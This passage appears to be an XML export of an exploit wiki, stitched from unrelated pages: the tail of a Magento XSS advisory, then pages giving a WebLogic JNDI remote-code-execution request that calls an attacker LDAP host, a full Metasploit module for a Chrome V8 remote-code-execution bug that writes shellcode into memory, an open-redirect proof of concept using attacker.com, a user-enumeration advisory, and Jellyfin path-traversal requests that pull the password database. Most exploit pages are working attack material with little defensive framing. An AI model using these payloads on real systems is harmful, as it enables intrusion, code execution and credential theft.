                     An integrated part of SEC Consult, an Atos company
                     Europe | Asia | North America

                     https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"Magento Commerce, offers a one-of-a-kind eCommerce solution with
enterprise power, unlimited scalability, and open-source flexibility
for B2C and B2B experiences. Magento allows you to create unique,
full-lifecycle customer experiences proven to generate more sales.
No matter what your company’s size or goals — omnichannel, global
expansion, mobile — Magento delivers everything you need for growth
in an increasingly competitive market."

Source: https://magento.com/products


Business recommendation:
------------------------
Update to the latest version of Adobe Magento Commerce.

An in-depth security analysis performed by security professionals is highly
advised, as the software may be affected from further security issues.


Vulnerability overview/description:
-----------------------------------
1) Reflected Cross-Site Scripting (XSS) (CVE-2021-21029)
This vulnerability allows an unauthenticated user to inject malicious
client side script into the URL and send to the victim. The browser may
redirect the victim (e.g. admin) to the frontend page when visiting the URL,
the script will be executed after the victim visits the admin panel again.

This vulnerability has two different scenarios:
1. Security configuration "Add Secret Key to URLs" is enabled (default).
 - Admin panel path is required.
 - Key value (secret hash) in the URL is required.
 - User interaction is required (navigate back to the admin panel).

2. Security configuration "Add Secret Key to URLs" is disabled.
 - Admin panel path is required.
 - User interaction is required (navigate back to the admin panel).


Proof of concept:
-----------------
1) Reflected Cross-Site Scripting (XSS) (CVE-2021-21029)
The "file" parameter is vulnerable to reflected cross-site scripting
vulnerability. By sending the XSS payload in the Base64 encoded format
in the URL as follows:

1. Security configuration "Add Secret Key to URLs" is enabled (default).
URL format:
https://{baseURL}/{adminPath}/admin/system_design_theme/downloadCss/theme_id/{themeID}/file/{base64encoded_xss_payload}/key/{secret_hash}
Example URL:
https://127.0.0.1/index.php/admin/admin/system_design_theme/downloadCss/theme_id/1/file/PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFNFQyBDb25zdWx0Jyk8L3NjcmlwdD4%3D/key/0f5d20e8559bb6f45e4840ceb6231870f3a8fe122698b37c32ceabbb33595813

2. Security configuration "Add Secret Key to URLs" is disabled.
URL format:
https://{baseURL}/{adminPath}/admin/system_design_theme/downloadCss/theme_id/{themeID}/file/{base64encoded_xss_payload}/
Example URL:
https://127.0.0.1/index.php/admin/admin/system_design_theme/downloadCss/theme_id/1/file/PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFNFQyBDb25zdWx0Jyk8L3NjcmlwdD4%3D/


Vulnerable / tested versions:
-----------------------------
Magento2 version 2.3.5-p1 has been tested, which was the latest version
available at the time of the test. Previous versions may also be affected.
Later versions until the patched version v2.4.2 are affected as well.


Vendor contact timeline:
------------------------
2020-07-09 | Contacting vendor through https://hackerone.com/magento.
2020-07-09 | The report is flagged as out-of-scope in hackerone.
2020-08-13 | Contacting vendor and requesting encryption key through psirt@adobe.com.
2020-08-13 | Vendor provides PGP encryption key.
2020-08-14 | Sending encrypted advisory to the vendor.
2020-09-09 | Asking vendor for a status update.
2020-09-10 | Vendor is still investigating the issue.
2020-09-28 | Asking vendor for a status update.
2020-10-02 | Vendor is still investigating the issue.
2020-11-24 | Asking vendor for a status update.
2020-11-24 | Vendor is planing to fix the issue in next release.
2021-02-02 | Asking vendor for a status update and the release date.
2021-02-02 | Vendor is planing to release a security update on February 9th.
2021-02-10 | Coordinated release of security advisory.


Solution:
---------
Update to the latest available version v2.4.2 of Magento2 from the vendor's download
page:
https://magento.com/tech-resources/download

Vendor security advisory:
https://helpx.adobe.com/security/products/magento/apsb21-08.html


Workaround:
-----------
None


Advisory URL:
-------------
https://sec-consult.com/vulnerability-lab/


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult, an Atos company
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Atos company. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application https://sec-consult.com/career/

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices https://sec-consult.com/contact/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: https://www.sec-consult.com
Blog: http://blog.sec-consult.com
Twitter: https://twitter.com/sec_consult

EOF N. Jirathammanuwat / @2021

&lt;/pre&gt;</text>
      <sha1>mb4g0zp7q3b8g9wxlnb5xz95kpr26nm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-2109 Weblogic Server遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>63</id>
    <revision>
      <id>124</id>
      <timestamp>2021-03-02T06:32:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「 {| style="margin: auto; width: 750px;" | style="text-align: left; margin: 1em 1em 1em 0; border: 1px solid #20A3C0; padding: .2em;" | {| cellspacing="2px"  | val…」的新頁面</comment>
      <origin>124</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1019" sha1="1tccu11vlvepp5w2sqyptpse6rdtn7a" xml:space="preserve">
{| style="margin: auto; width: 750px;"
| style="text-align: left; margin: 1em 1em 1em 0; border: 1px solid #20A3C0; padding: .2em;" |
{| cellspacing="2px" 
| valign="middle" | [[Image:Book.png|50px]]
| 這個頁面的內容缺少參考，無法保證內容的準確性。
|}
|}
&lt;br&gt;&lt;noinclude&gt;


==影響版本==
Weblogic Server 10.3.6.0.0

Weblogic Server 12.1.3.0.0

Weblogic Server 12.2.1.3.0

Weblogic Server 12.2.1.4.0

Weblogic Server 14.1.1.0.0


==漏洞利用==
下載[https://github.com/feihong-cs/JNDIExploit/releases/tag/v.1.11 LDAP] (LDAP需要Java1.8環境)。

&lt;pre&gt;
java -jar JNDIExploit-v1.11.jar -i 192.168.1.123
&lt;/pre&gt;

首頁URL後加入
&lt;pre&gt;
/console/css/%252e%252e%252f/consolejndi.portal
&lt;/pre&gt;

在Burp中，将get修改爲post，並且構造數據包。

注：192.168.1;123 有個點修改爲分號。

&lt;pre&gt;
_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.1;123:1389/Basic/WeblogicEcho;AdminServer%22)
&lt;/pre&gt;</text>
      <sha1>1tccu11vlvepp5w2sqyptpse6rdtn7a</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21156&amp;CVE-2021-21148 Chrome Array Transfer 繞過漏洞</title>
    <ns>0</ns>
    <id>2381</id>
    <revision>
      <id>2868</id>
      <timestamp>2021-05-15T05:05:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; The fix for CVE-2021-21148 has added a check in |ValueSerializer::WriteJSArrayBuffer| to make sure non-detachable array buffers cannot be transferred. The check..."</comment>
      <origin>2868</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="324" sha1="6st7e704ifdv7emrk192dbazij11fkx" xml:space="preserve">==INFO==
&lt;pre&gt;
The fix for CVE-2021-21148 has added a check in |ValueSerializer::WriteJSArrayBuffer| to make sure non-detachable array buffers cannot be transferred. The check can be bypassed with the help of asm.js and property getters.
&lt;/pre&gt;

==File==
https://github.com/JustYoomoon/Exploit/blob/main/GS20210514135013.tgz</text>
      <sha1>6st7e704ifdv7emrk192dbazij11fkx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21198 Chrome Legacy ipc共享內存消息傳遞漏洞</title>
    <ns>0</ns>
    <id>3557</id>
    <revision>
      <id>4132</id>
      <timestamp>2021-06-06T13:41:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞利用== &lt;/translate&gt; &lt;pre&gt; # Trovent Security Advisory 2104-01 # #####################################   User enumeration through API ######..."</comment>
      <origin>4132</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3781" sha1="k1x38sw1vxlm8vrcu66xnog0xtpmumr" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;
&lt;pre&gt;
# Trovent Security Advisory 2104-01 #
#####################################


User enumeration through API
############################


Overview
########

Advisory ID: TRSA-2104-01
Advisory version: 1.0
Advisory status: Public
Advisory URL: https://trovent.io/security-advisory-2104-01
Affected product: HealthForYou &amp; Sanitas HealthCoach mobile and web applications
Tested versions: HealthForYou 1.11.1 (com.hansdinslage.connect.HealthForYou),
                 HealthCoach 2.9.2 (de.sanitas_online.healthcoach)
Vendor: Hans Dinslage GmbH (subsidiary of Beurer GmbH https://www.beurer.com)
Credits: Trovent Security GmbH, Nick Decker


Detailed description
####################

Trovent Security GmbH discovered a vulnerability in the server API of
the mobile apps Sanitas HealthCoach and HealthForYou.
The API call "/BHMCWebAPI/User/GetIsUserAlreadyExists/?emailId=" allows
to easily enumerate registered usernames and email addresses.
This knowledge could aid an attacker with further exploits as
demonstrated by TRSA-2104-02.

Severity: Medium
CVSS Score: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
CWE ID: CWE-203
CVE ID: N/A


Proof of concept
################

HealthForYou
############

Sample request to check if my colleague's email address is registered:

REQUEST:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


GET /BHMCWebAPI/User/GetIsUserAlreadyExists/?emailId=s.pietsch@trovent.io HTTP/1.1
Content-Type: application/json; charset=UTF-8
Accept-Encoding: gzip, deflate
User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
Host: sync.healthforyou-lidl.com
Connection: close
Content-Length: 0


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

RESPONSE:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


HTTP/1.1 200 OK
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
content-type: application/json; charset=utf-8
content-length: 4
etag: W/"4-X/5TO4MPCKAyY0ipFgr6/IraRNs"
date: Wed, 28 Apr 2021 11:25:24 GMT
x-envoy-upstream-service-time: 118
server: istio-envoy
connection: close

true


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



HealthCoach
###########

Sample request to check if my colleague's email address is registered:

REQUEST:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


GET /BHMCWebAPI/User/GetIsUserAlreadyExists/?emailId=s.pietsch@trovent.io HTTP/1.1
Content-Type: application/json; charset=UTF-8
Accept-Encoding: gzip, deflate
User-Agent: Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003)
Host: sync.connect-sanitas-online.de
Connection: close
Content-Length: 0


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

RESPONSE:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


HTTP/1.1 200 OK
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
content-type: application/json; charset=utf-8
content-length: 4
etag: W/"4-X/5TO4MPCKAyY0ipFgr6/IraRNs"
date: Wed, 28 Apr 2021 11:34:02 GMT
x-envoy-upstream-service-time: 78
server: istio-envoy
connection: close

true


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Solution / Workaround
#####################

To mitigate this vulnerability, we recommend to disable this API call.
In general it is recommended to prevent attackers from enumerating valid usernames.


History
#######

2021-04-27: Vulnerability found
2021-04-28: Advisory created, vendor and BSI contacted
2021-04-30: Vendor acknowledged the vulnerability to Trovent and BSI
2021-06-04: Advisory published
&lt;/pre&gt;</text>
      <sha1>k1x38sw1vxlm8vrcu66xnog0xtpmumr</sha1>
    </revision>
    <revision>
      <id>4133</id>
      <parentid>4132</parentid>
      <timestamp>2021-06-06T13:42:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Replaced content with "&lt;languages /&gt; &lt;translate&gt; ==文件== &lt;/translate&gt; https://github.com/JustYoomoon/Exploit/blob/main/GS20210604133940.tgz"</comment>
      <origin>4133</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="119" sha1="7k374hdo1oj5lb4w3zdvhek2g8n4pia" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==文件==
&lt;/translate&gt;
https://github.com/JustYoomoon/Exploit/blob/main/GS20210604133940.tgz</text>
      <sha1>7k374hdo1oj5lb4w3zdvhek2g8n4pia</sha1>
    </revision>
    <revision>
      <id>4134</id>
      <parentid>4133</parentid>
      <timestamp>2021-06-06T13:43:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4134</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="130" sha1="5gm5e9uz4x5ym8zsn58hvi7qkwb5xjc" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==文件== &lt;!--T:1--&gt;
&lt;/translate&gt;
https://github.com/JustYoomoon/Exploit/blob/main/GS20210604133940.tgz</text>
      <sha1>5gm5e9uz4x5ym8zsn58hvi7qkwb5xjc</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21198 Chrome Legacy ipc共享內存消息傳遞漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3570</id>
    <revision>
      <id>4149</id>
      <timestamp>2021-06-06T13:50:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-21198 Chrome Legacy ipc共享内存消息传递漏洞"</comment>
      <origin>4149</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="94" sha1="sy5hlkv05jwmg183dd7s0t4z3b1gu6h" xml:space="preserve">&lt;languages /&gt;
==文件==
https://github.com/JustYoomoon/Exploit/blob/main/GS20210604133940.tgz</text>
      <sha1>sy5hlkv05jwmg183dd7s0t4z3b1gu6h</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21198 Chrome Legacy ipc共享內存消息傳遞漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3563</id>
    <revision>
      <id>4140</id>
      <timestamp>2021-06-06T13:45:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==文件=="</comment>
      <origin>4140</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="94" sha1="sy5hlkv05jwmg183dd7s0t4z3b1gu6h" xml:space="preserve">&lt;languages /&gt;
==文件==
https://github.com/JustYoomoon/Exploit/blob/main/GS20210604133940.tgz</text>
      <sha1>sy5hlkv05jwmg183dd7s0t4z3b1gu6h</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21220 Google Chrome XOR Typer 越權訪問/遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1810</id>
    <revision>
      <id>2227</id>
      <timestamp>2021-05-05T05:09:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule..."</comment>
      <origin>2227</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5735" sha1="lll7wrh4ycnujrzli84cetf3x1k0rgv" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Post::File
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Google Chrome versions before 89.0.4389.128 V8 XOR Typer Out-Of-Bounds Access RCE',
        'Description' =&gt; %q{
          This module exploits an issue in the V8 engine on x86_x64 builds of Google Chrome before 89.0.4389.128/90.0.4430.72
          when handling XOR operations in JIT'd JavaScript code. Successful exploitation allows an attacker to execute
          arbitrary code within the context of the V8 process.

          As the V8 process is normally sandboxed in the default configuration of Google Chrome, the browser must be run with the
          --no-sandbox option for the payload to work correctly.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt; [
          'Bruno Keith (bkth_)', # Vulnerability Discovery
          'Niklas Baumstark (_niklasb)', # Vulnerabilty Discovery
          'Rajvardhan Agarwal (r4j0x00)', # exploit
          'Grant Willcox (tekwizz123)' # Metasploit Module
        ],
        'References' =&gt; [
          ['CVE', '2021-21220'],
          ['URL', 'https://github.com/r4j0x00/exploits/tree/master/chrome-0day'],
          ['URL', 'https://twitter.com/r4j0x00/status/1382125720344793090'],
          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=1196683'], # Restricted at the time of writing, but should be public at some point.
          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-21-411/']
        ],
        'Arch' =&gt; [ ARCH_X64 ],
        'DefaultTarget' =&gt; 0,
        'Payload' =&gt;
        {
          'Space' =&gt; 4096
        },
        'Notes' =&gt;
        {
          'Reliability' =&gt; [ REPEATABLE_SESSION ],
          'SideEffects' =&gt; [ IOC_IN_LOGS ]
        },
        'Targets' =&gt;
          [
            ['Linux - Google Chrome &lt; 89.0.4389.128/90.0.4430.72 (64 bit)', { 'Platform' =&gt; 'linux' }],
            ['Windows 10 - Google Chrome &lt; 89.0.4389.128/90.0.4430.72 (64 bit)', { 'Platform' =&gt; 'win' }],
            ['macOS - Google Chrome &lt; 89.0.4389.128/90.0.4430.72 (64 bit)', { 'Platform' =&gt; 'osx' }],
          ],
        'DisclosureDate' =&gt; '2021-04-13'
      )
    )
  end

  def on_request_uri(cli, request)
    print_status("Sending #{request.uri} to #{request['User-Agent']}")
    shellcode = Rex::Text.to_num(payload.encoded).gsub(/\r\n/, '')
    jscript = &lt;&lt;~JS
      var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
      var wasm_mod = new WebAssembly.Module(wasm_code);
      var wasm_instance = new WebAssembly.Instance(wasm_mod);
      var wasm_main_func = wasm_instance.exports.main;

      var buf = new ArrayBuffer(8);
      var f64_buf = new Float64Array(buf);
      var u64_buf = new Uint32Array(buf);

      var shellcode = new Uint8Array([#{shellcode}]);
      var shellbuf = new ArrayBuffer(shellcode.length);
      var dataview = new DataView(shellbuf);

      function ftoi(val) {
        f64_buf[0] = val;
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) &lt;&lt; 32n);
      }

      function itof(val) {
        u64_buf[0] = Number(val &amp; 0xffffffffn);
        u64_buf[1] = Number(val &gt;&gt; 32n);
        return f64_buf[0];
      }

      const _arr = new Uint32Array([2**31]);

      function foo() {
        var x = 1;
        x = (_arr[0] ^ 0) + 1;

        x = Math.abs(x);
        x -= 0x7FFFFFFF;
        x = Math.max(x, 0);

        x -= 1;
        if(x==-1) x = 0;

        var arr = new Array(x);
        arr.shift();
        var cor = [1.1, 1.2, 1.3];

        return [arr, cor];
      }

      for(var i=0;i&lt;0x3000;++i)
        foo();

      var x = foo();
      var arr = x[0];
      var cor = x[1];

      const idx = 6;
      arr[idx+10] = 0x4242;

      if (cor.length == 3) location.reload();

      function addrof(k) {
        arr[idx+1] = k;
        return ftoi(cor[0]) &amp; 0xffffffffn;
      }

      function fakeobj(k) {
        cor[0] = itof(k);
        return arr[idx+1];
      }

      var arr2 = [cor[3], 1.2, 2.3, 3.4];
      var fake = fakeobj(addrof(arr2) + 0x20n);

      function arbread(addr) {
        if (addr % 2n == 0) {
          addr += 1n;
        }
        arr2[1] = itof((2n &lt;&lt; 32n) + addr - 8n);
        return (fake[0]);
      }

      function arbwrite(addr, val) {
        if (addr % 2n == 0) {
          addr += 1n;
        }
        arr2[1] = itof((2n &lt;&lt; 32n) + addr - 8n);
        fake[0] = itof(BigInt(val));
      }

      function copy_shellcode(addr, shellcode) {
        let buf_addr = addrof(shellbuf);
        let backing_store_addr = buf_addr + 0x14n;
        arbwrite(backing_store_addr, addr);

        for (let i = 0; i &lt; shellcode.length; i++) {
          dataview.setUint8(i, shellcode[i]);
        }
      }

      var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));
      copy_shellcode(rwx_page_addr, shellcode);
      wasm_main_func();
    JS

    html = &lt;&lt;~HTML
      &lt;html&gt;
      &lt;head&gt;
      &lt;script&gt;
      #{jscript}
      &lt;/script&gt;
      &lt;/head&gt;
      &lt;body&gt;
      &lt;/body&gt;
      &lt;/html&gt;
    HTML
    send_response(cli, html, { 'Content-Type' =&gt; 'text/html', 'Cache-Control' =&gt; 'no-cache, no-store, must-revalidate', 'Pragma' =&gt; 'no-cache', 'Expires' =&gt; '0' })
  end

end
&lt;/pre&gt;</text>
      <sha1>lll7wrh4ycnujrzli84cetf3x1k0rgv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21315 NodeJS命令注入漏洞</title>
    <ns>0</ns>
    <id>72</id>
    <revision>
      <id>136</id>
      <timestamp>2021-03-03T15:08:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「{| style="margin: auto; width: 750px;" | style="text-align: left; margin: 1em 1em 1em 0; border: 1px solid #20A3C0; padding: .2em;" | {| cellspacing="2px"  | vali…」的新頁面</comment>
      <origin>136</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="361" sha1="6cjfcup9m5ac0uzu9zqawgton063epf" xml:space="preserve">{| style="margin: auto; width: 750px;"
| style="text-align: left; margin: 1em 1em 1em 0; border: 1px solid #20A3C0; padding: .2em;" |
{| cellspacing="2px" 
| valign="middle" | [[Image:Book.png|50px]]
| 這個頁面的內容缺少參考，無法保證內容的準確性。
|}
|}
&lt;br&gt;&lt;noinclude&gt;


==POC==
https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC</text>
      <sha1>6cjfcup9m5ac0uzu9zqawgton063epf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21337 Products.PluggableAuthService 2.6.0 開放式重定向漏洞</title>
    <ns>0</ns>
    <id>3337</id>
    <revision>
      <id>3895</id>
      <timestamp>2021-06-03T00:57:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Products.PluggableAuthService 2.6.0 - Open Redirect # Exploit Author: Piyush Patil # Affected Component: Pluggable Zope authentication/authoriza..."</comment>
      <origin>3895</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="766" sha1="cx9fxt41tk3daxl0cjydzobyuhar06j" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Products.PluggableAuthService 2.6.0 - Open Redirect
# Exploit Author: Piyush Patil
# Affected Component: Pluggable Zope authentication/authorization framework
# Component Link: https://pypi.org/project/Products.PluggableAuthService/
# Version: &lt; 2.6.1
# CVE: CVE-2021-21337
# Reference: https://github.com/zopefoundation/Products.PluggableAuthService/security/advisories/GHSA-p44j-xrqg-4xrr


--------------------------Proof of Concept-----------------------

1- Goto https://localhost/login
2- Turn on intercept and click on the login
3- Change "came_from" parameter value to https://attacker.com
4- User will be redirected to an attacker-controlled website.

Fix: pip install "Products.PluggableAuthService&gt;=2.6.1"
           
&lt;/pre&gt;</text>
      <sha1>cx9fxt41tk3daxl0cjydzobyuhar06j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21402 Jellyfin 任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>924</id>
    <revision>
      <id>1193</id>
      <timestamp>2021-04-08T04:04:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==影響版本== &lt;/translate&gt;  &lt;pre&gt; jellyfin&lt;=10.7.0 &lt;/pre&gt;  ==FOFA== &lt;pre&gt; title="Jellyfin" &lt;/pre&gt;   ==POC1== &lt;translate&gt; 從服務器下載帶..."</comment>
      <origin>1193</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1314" sha1="353m0xmzzttajc46ebsivf52vlnqfyf" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;

&lt;pre&gt;
jellyfin&lt;=10.7.0
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="Jellyfin"
&lt;/pre&gt;


==POC1==
&lt;translate&gt;
從服務器下載帶有密碼的&lt;code&gt;jellyfin.db&lt;/code&gt;
&lt;/translate&gt;
&lt;pre&gt;
GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1
Host: x.x.x.x
accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Referer: http://x.x.x.x/web/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
&lt;/pre&gt;

==POC2==
&lt;pre&gt;
GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1
&lt;/pre&gt;

==POC3==
&lt;pre&gt;
GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1
&lt;/pre&gt;

==POC4==
&lt;translate&gt;
要下載的POC &lt;code&gt;c:tempfilename.jpg&lt;/code&gt;
&lt;/translate&gt;

&lt;pre&gt;
GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1 
GET /Images/Ratings/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctemp/filename HTTP/1.1
&lt;/pre&gt;


==POC5==
&lt;pre&gt;
POST /Videos/d7634eb0064cce760f3f0bf8282c16cd/Subtitles HTTP/1.1
...
X-Emby-Authorization: MediaBrowser DeviceId="...", Version="10.7.0", Token="..."
...

{"language":".\..\","format":".\..\test.bin","isForced":false,"data":"base64 encoded data"}
&lt;/pre&gt;</text>
      <sha1>353m0xmzzttajc46ebsivf52vlnqfyf</sha1>
    </revision>
    <revision>
      <id>1194</id>
      <parentid>1193</parentid>
      <timestamp>2021-04-08T04:04:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1194</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1347" sha1="53cj8bpsk24m88ke8il731vuasqj83e" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;pre&gt;
jellyfin&lt;=10.7.0
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="Jellyfin"
&lt;/pre&gt;


==POC1==
&lt;translate&gt;
&lt;!--T:2--&gt;
從服務器下載帶有密碼的&lt;code&gt;jellyfin.db&lt;/code&gt;
&lt;/translate&gt;
&lt;pre&gt;
GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1
Host: x.x.x.x
accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Referer: http://x.x.x.x/web/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
&lt;/pre&gt;

==POC2==
&lt;pre&gt;
GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1
&lt;/pre&gt;

==POC3==
&lt;pre&gt;
GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1
&lt;/pre&gt;

==POC4==
&lt;translate&gt;
&lt;!--T:3--&gt;
要下載的POC &lt;code&gt;c:tempfilename.jpg&lt;/code&gt;
&lt;/translate&gt;

&lt;pre&gt;
GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1 
GET /Images/Ratings/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctemp/filename HTTP/1.1
